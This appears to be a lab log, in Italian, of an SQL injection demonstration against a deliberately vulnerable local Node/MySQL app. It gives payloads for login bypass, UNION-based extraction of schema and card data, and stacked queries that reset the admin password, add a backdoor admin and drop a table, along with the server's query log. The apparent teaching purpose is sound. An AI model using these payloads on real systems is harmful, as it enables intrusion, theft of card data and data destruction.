@@ -1,0 +1,80 @@
+Risultati di una esecuzione di `npm run attack` (web/attack.js) sull'ambiente Docker.
+Ambiente: MySQL 5.7.44, Node 14 + Express, driver mysql con multipleStatements: true.
+
+
+----- output lato attaccante -------------------------------------------------
+
+target: http://localhost:3000
+
+----- FASE 1 - tautologia (login) -----
+payload: ' OR '1'='1' --
+-> HTTP 302 redirect /search?justLogged=1 (dentro)
+
+----- FASE 2 - commento di fine riga (login come admin) -----
+payload: admin' --
+-> HTTP 302 redirect /search?justLogged=1
+
+----- FASE 3 - conto le colonne (ORDER BY) -----
+ORDER BY 5 -> HTTP 500 :: DB error: ER_BAD_FIELD_ERROR Unknown column '5' in 'order clause'
+ORDER BY 4 -> HTTP 500 :: DB error: ER_BAD_FIELD_ERROR Unknown column '4' in 'order clause'
+ORDER BY 3 -> HTTP 200 :: Search results (utente loggato: admin) Nessun risultato
+quindi sono 3 colonne (con 4 va in errore, con 3 no).
+
+----- FASE 4 - versione / utente / database -----
+payload: ' UNION SELECT @@version, current_user(), database() --
+-> id: 5.7.44 - Name: user@% - Password: testdb
+
+----- FASE 5 - elenco tabelle (information_schema) -----
+payload: ' UNION SELECT table_name, table_schema, 1 FROM information_schema.tables WHERE table_schema = database() --
+-> carte_credito | ordini | users  (tutte in testdb)
+salta fuori carte_credito, che prima non sapevo esistesse.
+
+----- FASE 6 - colonne di carte_credito -----
+payload: ' UNION SELECT column_name, data_type, 1 FROM information_schema.columns WHERE table_name = 'carte_credito' --
+-> id(int) | user_id(int) | intestatario(varchar) | numero(varchar) | cvv(varchar) | scadenza(varchar)
+
+----- FASE 7 - esfiltrazione carte_credito -----
+payload: ' UNION SELECT numero, cvv, intestatario FROM carte_credito --
+-> 4539115678901234 | 321 | Mario Bianchi
+   5105105105105100 | 852 | Luigi Verdi
+   4916338506082832 | 147 | Marco Rossi
+
+----- FASE 8 - UPDATE password admin (piggyback) -----
+payload: x'; UPDATE users SET password = 'hacked123' WHERE username = 'admin'; --
+-> HTTP 302 redirect /search?justLogged=1
+controllo admin: id: 1 - Name: admin - Password: hacked123
+
+----- FASE 9 - INSERT utente backdoor (piggyback) -----
+payload: x'; INSERT INTO users (username, password, ruolo) VALUES ('attacker', 'attackerpass', 'admin'); --
+-> HTTP 302 redirect /search?justLogged=1
+controllo: id: 4 - Name: attacker - Password: attackerpass
+
+----- FASE 10 - DROP TABLE carte_credito (piggyback) -----
+payload: x'; DROP TABLE carte_credito; --
+-> HTTP 302 redirect /search?justLogged=1
+riprovo a leggerla:
+-> HTTP 500 :: DB error: ER_NO_SUCH_TABLE Table 'testdb.carte_credito' doesn't exist
+tabella sparita, i dati non si possono piu' leggere.
+
+fine. compromesse tutte e tre le proprieta CIA.
+
+
+----- log lato server (le query che il DB ha eseguito davvero) ----------------
+# da `docker compose logs web`. si vede che l'input dell'utente viene incollato
+# dentro la query, senza parametrizzazione.
+
+Eseguo query (vulnerable login): SELECT id, username FROM users WHERE username = '' OR '1'='1' -- ' AND password = 'qualsiasi'
+Eseguo query (vulnerable login): SELECT id, username FROM users WHERE username = 'admin' -- ' AND password = 'password_a_caso'
+Eseguo (vulnerable search): SELECT id, username, password FROM users WHERE username = '' ORDER BY 5 -- '
+Eseguo (vulnerable search): SELECT id, username, password FROM users WHERE username = '' ORDER BY 4 -- '
+Eseguo (vulnerable search): SELECT id, username, password FROM users WHERE username = '' ORDER BY 3 -- '
+Eseguo (vulnerable search): SELECT id, username, password FROM users WHERE username = '' UNION SELECT @@version, current_user(), database() -- '
+Eseguo (vulnerable search): SELECT id, username, password FROM users WHERE username = '' UNION SELECT table_name, table_schema, 1 FROM information_schema.tables WHERE table_schema = database() -- '
+Eseguo (vulnerable search): SELECT id, username, password FROM users WHERE username = '' UNION SELECT column_name, data_type, 1 FROM information_schema.columns WHERE table_name = 'carte_credito' -- '
+Eseguo (vulnerable search): SELECT id, username, password FROM users WHERE username = '' UNION SELECT numero, cvv, intestatario FROM carte_credito -- '
+Eseguo query (vulnerable login): SELECT id, username FROM users WHERE username = 'x'; UPDATE users SET password = 'hacked123' WHERE username = 'admin'; -- ' AND password = 'x'
+Eseguo (vulnerable search): SELECT id, username, password FROM users WHERE username = 'admin'
+Eseguo query (vulnerable login): SELECT id, username FROM users WHERE username = 'x'; INSERT INTO users (username, password, ruolo) VALUES ('attacker', 'attackerpass', 'admin'); -- ' AND password = 'x'
+Eseguo (vulnerable search): SELECT id, username, password FROM users WHERE username = 'attacker'
+Eseguo query (vulnerable login): SELECT id, username FROM users WHERE username = 'x'; DROP TABLE carte_credito; -- ' AND password = 'x'
+Eseguo (vulnerable search): SELECT id, username, password FROM users WHERE username = '' UNION SELECT numero, cvv, intestatario FROM carte_credito -- '
